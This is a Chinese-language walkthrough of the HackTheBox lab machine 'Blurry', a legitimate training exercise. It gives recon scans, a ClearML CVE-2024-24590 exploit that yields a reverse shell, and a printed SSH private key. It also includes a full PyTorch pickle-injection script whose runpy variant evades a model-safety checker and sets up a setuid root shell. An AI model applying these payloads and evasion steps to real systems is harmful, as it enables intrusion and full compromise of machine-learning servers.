---
title: blurry
pagination_prev: null
pagination_next: null
---


# 端口扫描
### 全端口扫描
~~~
┌──(kali㉿kali)-[~/blurry]
└─$ sudo nmap -sT -p- --min-rate 1000 10.10.11.19 -oA nmap/ports
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-11-11 00:43 EST
Nmap scan report for 10.10.11.19
Host is up (0.084s latency).
Not shown: 65533 closed tcp ports (conn-refused)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 81.93 seconds
 
~~~
### 默认脚本扫描
~~~
┌──(kali㉿kali)-[~/blurry]
└─$ sudo nmap -sT -sV -sC -p22,80 10.10.11.19 -oA nmap/sC
[sudo] password for kali: 
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-11-11 00:46 EST
Stats: 0:00:06 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan
Service scan Timing: About 50.00% done; ETC: 00:47 (0:00:06 remaining)
Nmap scan report for 10.10.11.19
Host is up (0.084s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u3 (protocol 2.0)
| ssh-hostkey: 
|   3072 3e:21:d5:dc:2e:61:eb:8f:a6:3b:24:2a:b7:1c:05:d3 (RSA)
|   256 39:11:42:3f:0c:25:00:08:d7:2f:1b:51:e0:43:9d:85 (ECDSA)
|_  256 b0:6f:a0:0a:9e:df:b1:7a:49:78:86:b2:35:40:ec:95 (ED25519)
80/tcp open  http    nginx 1.18.0
|_http-server-header: nginx/1.18.0
|_http-title: Did not follow redirect to http://app.blurry.htb/
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 10.88 seconds
 
~~~
### 漏洞脚本扫描
~~~
┌──(kali㉿kali)-[~/blurry]
└─$ sudo nmap -sT --script=vuln -p22,80 10.10.11.19 -oA nmap/vuln
[sudo] password for kali: 
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-11-11 00:47 EST
Pre-scan script results:
| broadcast-avahi-dos: 
|   Discovered hosts:
|     224.0.0.251
|   After NULL UDP avahi packet DoS (CVE-2011-1002).
|_  Hosts are all up (not vulnerable).
Nmap scan report for 10.10.11.19
Host is up (0.077s latency).

PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
|_http-dombased-xss: Couldn't find any DOM based XSS.
|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
|_http-csrf: Couldn't find any CSRF vulnerabilities.

Nmap done: 1 IP address (1 host up) scanned in 367.81 seconds

~~~
### UDP扫描
~~~
┌──(kali㉿kali)-[~/blurry]
└─$ sudo nmap -sU --top-ports 20 10.10.11.19 -oA nmap/UDP                                                                                                                                                   
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-11-11 00:56 EST
Nmap scan report for blurry.htb (10.10.11.19)
Host is up (0.13s latency).

PORT      STATE         SERVICE
53/udp    closed        domain
67/udp    closed        dhcps
68/udp    open|filtered dhcpc
69/udp    closed        tftp
123/udp   closed        ntp
135/udp   closed        msrpc
137/udp   closed        netbios-ns
138/udp   closed        netbios-dgm
139/udp   closed        netbios-ssn
161/udp   closed        snmp
162/udp   closed        snmptrap
445/udp   closed        microsoft-ds
500/udp   closed        isakmp
514/udp   closed        syslog
520/udp   closed        route
631/udp   closed        ipp
1434/udp  closed        ms-sql-m
1900/udp  closed        upnp
4500/udp  closed        nat-t-ike
49152/udp closed        unknown

Nmap done: 1 IP address (1 host up) scanned in 16.42 seconds
 
~~~
# 80(web)
脚本扫描的时候发现了域名blurry.htb
进行一下子域名枚举
~~~
┌──(kali㉿kali)-[~/blurry]                                                         └─$ wfuzz -c -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -u http://blurry.htb -H "Host: FUZZ.blurry.htb" --hh 169                                                                   
********************************************************                           * Wfuzz 3.1.0 - The Web Fuzzer                         *                           ********************************************************                           Target: http://blurry.htb/                                                         Total requests: 4989                                                               =====================================================================              ID           Response   Lines    Word       Chars       Payload                    =====================================================================

000000051:   400        0 L      4 W        280 Ch      "api"                      000000070:   200        448 L    12829 W    218733 Ch   "chat"                     000000111:   200        28 L     363 W      13327 Ch    "app"                      000000096:   200        0 L      1 W        2 Ch        "files"                    Total time: 0
Processed Requests: 4989
Filtered Requests: 4985
Requests/sec.: 0


~~~
更改hosts文件
~~~
┌──(kali㉿kali)-[~/blurry]
└─$ cat /etc/hosts
127.0.0.1       localhost
127.0.1.1       kali
::1             localhost ip6-localhost ip6-loopback
ff02::1         ip6-allnodes
ff02::2         ip6-allrouters
10.10.11.19     blurry.htb
10.10.11.19     api.blurry.htb
10.10.11.19     app.blurry.htb
10.10.11.19     files.blurry.htb
10.10.11.19     chat.blurry.htb
~~~
### http://api.blurry.htb
似乎是一个托管ai模型的平台，暂时搁置
![](./image/Pasted image 20241111150144.png)
### http://files.blurry.htb/
只有一个OK
![](./image/Pasted image 20241111150325.png)
### http://api.blurry.htb/
api不知道是干什么用的
![](./image/Pasted image 20241111150429.png)
### http://chat.blurry.htb
似乎是一个在线聊天室，注册个账号登进去
![](./image/Pasted image 20241111150446.png)
可以得到几个用户名，并且jippity是管理员
搜索了一下chat.rocket的漏洞利用脚本，需要管理员的邮箱，而我们现在没有，先回去看看有没有其他的信息
这里可以查到clearML的版本为1.13.1
![](./image/Pasted image 20241111163003.png)
寻找nday，发现有rce可以利用，[网址](https://github.com/junnythemarksman/CVE-2024-24590?tab=readme-ov-file)
~~~
┌──(venv)─(kali㉿kali)-[~/blurry/venv]
└─$ clearml-init
ClearML SDK setup process
Configuration file already exists: /home/kali/clearml.conf
Leaving setup, feel free to edit the configuration file.
┌──(venv)─(kali㉿kali)-[~/blurry/venv]
└─$ cd CVE-2024-24590 
┌──(venv)─(kali㉿kali)-[~/blurry/venv/CVE-2024-24590]
└─$ ls
exploit.py  README.md
┌──(venv)─(kali㉿kali)-[~/blurry/venv/CVE-2024-24590]
└─$ python3 exploit.py -i 10.10.16.17 -p 443 -P "Black Swan"
ClearML Task: created new task id=10f92c05451d487ea35e57bab34bf087
ClearML results page: http://app.blurry.htb/projects/116c40b9b53743689239b6b460efd7be/experiments/10f92c05451d487ea35e57bab34bf087/output/log
CLEARML-SERVER new package available: UPGRADE to v1.16.2 is recommended!
Release Notes:
### Bug Fixes
- Fix no graphs are shown in workers and queues screens
ClearML Monitor: GPU monitoring failed getting GPU reading, switching off GPU monitoring

~~~
执行后等一段时间，发现收到了反弹shell
~~~
┌──(kali㉿kali)-[~/blurry]
└─$ sudo rlwrap nc -lvnp 443
[sudo] password for kali: 
listening on [any] 443 ...
connect to [10.10.16.17] from (UNKNOWN) [10.10.11.19] 58012
bash: cannot set terminal process group (8382): Inappropriate ioctl for device
bash: no job control in this shell
jippity@blurry:~$ 


~~~
# 提权
家目录中发现了ssh的私钥文件，我们切换ssh登录
~~~
jippity@blurry:~$ ll                      
ll
total 60K
654083 drwxr-xr-x 6 jippity jippity 4.0K May 30 04:41 .
654081 drwxr-xr-x 3 root    root    4.0K Feb  6  2024 ..
657174 drwxr-xr-x 2 jippity jippity 4.0K Feb 17  2024 automation
654084 lrwxrwxrwx 1 root    root       9 Feb 17  2024 .bash_history -> /dev/null
654086 -rw-r--r-- 1 jippity jippity  220 Feb  6  2024 .bash_logout
657168 -rw-r--r-- 1 jippity jippity 3.5K Feb  6  2024 .bashrc
659107 drwxr-xr-x 9 jippity jippity 4.0K Feb  8  2024 .clearml
680177 -rw-r--r-- 1 jippity jippity  11K Feb 17  2024 clearml.conf
657169 -rw-r--r-- 1 jippity jippity   29 Feb  6  2024 .clearml_data.json
662468 -rw-r--r-- 1 jippity jippity   22 Feb  8  2024 .gitconfig
654266 drwx------ 5 jippity jippity 4.0K Feb  6  2024 .local
654085 -rw-r--r-- 1 jippity jippity  807 Feb  6  2024 .profile
654087 lrwxrwxrwx 1 root    root       9 Feb 17  2024 .python_history -> /dev/null
667813 drwx------ 2 jippity jippity 4.0K Feb 17  2024 .ssh
654092 -rw-r----- 1 root    jippity   33 Nov 11 00:21 user.txt
jippity@blurry:~$ cd .ssh                 
cd .ssh
jippity@blurry:~/.ssh$ ll                           
ll
total 20K
667813 drwx------ 2 jippity jippity 4.0K Feb 17  2024 .
654083 drwxr-xr-x 6 jippity jippity 4.0K May 30 04:41 ..
654088 -rw-r--r-- 1 jippity jippity  568 Feb 17  2024 authorized_keys
679864 -rw------- 1 jippity jippity 2.6K Feb 14  2024 id_rsa
680125 -rw-r--r-- 1 jippity jippity  568 Feb 14  2024 id_rsa.pub
jippity@blurry:~/.ssh$ cat id_rsa                   
cat id_rsa
-----BEGIN OPENSSH PRIVATE KEY-----
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
-----END OPENSSH PRIVATE KEY-----
jippity@blurry:~/.ssh$ 
~~~

~~~
┌──(kali㉿kali)-[~/blurry]
└─$ vim id_rsa   
┌──(kali㉿kali)-[~/blurry]
└─$ chmod 600 id_rsa 
┌──(kali㉿kali)-[~/blurry]
└─$ ssh jippity@10.10.11.19 -i id_rsa 
The authenticity of host '10.10.11.19 (10.10.11.19)' can't be established.
ED25519 key fingerprint is SHA256:Yr2plP6C5tZyGiCNZeUYNDmsDGrfGijissa6WJo0yPY.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.11.19' (ED25519) to the list of known hosts.
Linux blurry 5.10.0-30-amd64 #1 SMP Debian 5.10.218-1 (2024-06-01) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Thu Aug  1 11:37:37 2024 from 10.10.14.40
jippity@blurry:~$ 

~~~
sudo -l查看有什么sudo权限
~~~
jippity@blurry:~$ sudo -l
Matching Defaults entries for jippity on blurry:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User jippity may run the following commands on blurry:
    (root) NOPASSWD: /usr/bin/evaluate_model /models/*.pth
~~~
查阅资料后
发现可以注入pytorch的模型文件,使用这篇[文章](https://hiddenlayer.com/research/weaponizing-machine-learning-models-with-ransomware/#Pickle-Code-Injection-POC)中的脚本
~~~
import os
import argparse
import pickle
import struct
import shutil
from pathlib import Path

import torch

class PickleInject():
    """Pickle injection. Pretends to be a "module" to work with torch."""
    def __init__(self, inj_objs, first=True):
        self.__name__ = "pickle_inject"
        self.inj_objs = inj_objs
        self.first = first

    class _Pickler(pickle._Pickler):
        """Reimplementation of Pickler with support for injection"""
        def __init__(self, file, protocol, inj_objs, first=True):
            super().__init__(file, protocol)

            self.inj_objs = inj_objs
            self.first = first

        def dump(self, obj):
            """Pickle data, inject object before or after"""
            if self.proto >= 2:
                self.write(pickle.PROTO + struct.pack("<B", self.proto))
            if self.proto >= 4:
                self.framer.start_framing()

            # Inject the object(s) before the user-supplied data?
            if self.first:
                # Pickle injected objects
                for inj_obj in self.inj_objs:
                    self.save(inj_obj)

            # Pickle user-supplied data
            self.save(obj)

            # Inject the object(s) after the user-supplied data?
            if not self.first:
                # Pickle injected objects
                for inj_obj in self.inj_objs:
                    self.save(inj_obj)

            self.write(pickle.STOP)
            self.framer.end_framing()

    def Pickler(self, file, protocol):
        # Initialise the pickler interface with the injected object
        return self._Pickler(file, protocol, self.inj_objs)

    class _PickleInject():
        """Base class for pickling injected commands"""
        def __init__(self, args, command=None):
            self.command = command
            self.args = args

        def __reduce__(self):
            return self.command, (self.args,)

    class System(_PickleInject):
        """Create os.system command"""
        def __init__(self, args):
            super().__init__(args, command=os.system)

    class Exec(_PickleInject):
        """Create exec command"""
        def __init__(self, args):
            super().__init__(args, command=exec)

    class Eval(_PickleInject):
        """Create eval command"""
        def __init__(self, args):
            super().__init__(args, command=eval)

    class RunPy(_PickleInject):
        """Create runpy command"""
        def __init__(self, args):
            import runpy
            super().__init__(args, command=runpy._run_code)

        def __reduce__(self):
            return self.command, (self.args,{})

parser = argparse.ArgumentParser(description="PyTorch Pickle Inject")
parser.add_argument("model", type=Path)
parser.add_argument("command", choices=["system", "exec", "eval", "runpy"])
parser.add_argument("args")
parser.add_argument("-v", "--verbose", help="verbose logging", action="count")

args = parser.parse_args()

command_args = args.args

# If the command arg is a path, read the file contents
if os.path.isfile(command_args):
    with open(command_args, "r") as in_file:
        command_args = in_file.read()

# Construct payload
if args.command == "system":
    payload = PickleInject.System(command_args)
elif args.command == "exec":
    payload = PickleInject.Exec(command_args)
elif args.command == "eval":
    payload = PickleInject.Eval(command_args)
elif args.command == "runpy":
    payload = PickleInject.RunPy(command_args)

# Backup the model
backup_path = "{}.bak".format(args.model)
shutil.copyfile(args.model, backup_path)

# Save the model with the injected payload
torch.save(torch.load(args.model), f=args.model, pickle_module=PickleInject([payload]))
~~~
提供了多种的注入方式
### eval
~~~
python .\inject.py .\demo_model.pth eval "import os;os.system('id')"
~~~
被检查出恶意代码
~~~
jippity@blurry:/models$ sudo /usr/bin/evaluate_model /models/injected.pth 
[!] Model /models/injected.pth contains OVERTLY_MALICIOUS components and will be deleted.
~~~
### runpy
~~~
python .\inject.py .\demo_model.pth runpy "import os;os.system('id')"
~~~
发现id执行了！
~~~
jippity@blurry:/models$ mv demo_model.pth.1  shell.pth
jippity@blurry:/models$ sudo /usr/bin/evaluate_model /models/shell.pth 
[+] Model /models/shell.pth is considered safe. Processing...
uid=0(root) gid=0(root) groups=0(root)
[+] Loaded Model.
[+] Dataloader ready. Evaluating model...
[+] Accuracy of the model on the test dataset: 56.25%
jippity@blurry:/models$ 
~~~
再构造具体的提权命令
~~~
python .\inject.py .\demo_model.pth runpy "import os;os.system('cp /bin/sh /tmp/rootshell;chmod +sx /tmp/rootshell')"
~~~
执行成功
~~~
jippity@blurry:/models$ mv demo_model.pth.1  shell.pth
jippity@blurry:/models$ sudo /usr/bin/evaluate_model /models/shell.pth 
[+] Model /models/shell.pth is considered safe. Processing...
[+] Loaded Model.
[+] Dataloader ready. Evaluating model...
[+] Accuracy of the model on the test dataset: 62.50%
jippity@blurry:/models$ ll /tmp
total 164K
130818 drwxrwxrwt 10 root    root    4.0K Nov 11 06:39 .
     2 drwxr-xr-x 19 root    root    4.0K Jun  3 09:28 ..
133337 prw-r--r--  1 jippity jippity    0 Nov 11 04:02 f
212580 drwxrwxrwt  2 root    root    4.0K Nov 11 00:21 .font-unix
212578 drwxrwxrwt  2 root    root    4.0K Nov 11 00:21 .ICE-unix
130892 -rwsr-sr-x  1 root    root    123K Nov 11 06:39 rootshell
212604 drwx------  3 root    root    4.0K Nov 11 00:21 systemd-private-8619b1aba1fa418ba66743b0aba5c9c3-systemd-logind.service-9K2Kof
212582 drwx------  3 root    root    4.0K Nov 11 00:21 systemd-private-8619b1aba1fa418ba66743b0aba5c9c3-systemd-timesyncd.service-0H3axi
212581 drwxrwxrwt  2 root    root    4.0K Nov 11 00:21 .Test-unix
212588 drwx------  2 root    root    4.0K Nov 11 00:21 vmware-root_294-860397889
212577 drwxrwxrwt  2 root    root    4.0K Nov 11 00:21 .X11-unix
212579 drwxrwxrwt  2 root    root    4.0K Nov 11 00:21 .XIM-unix
jippity@blurry:/models$ 

~~~
提权
~~~
jippity@blurry:/tmp$ ./rootshell -p                                                # whoami                                                                           
root
# cat root.txt
4758c57284f089dfded55c8348f1e030
~~~
成功拿下靶机


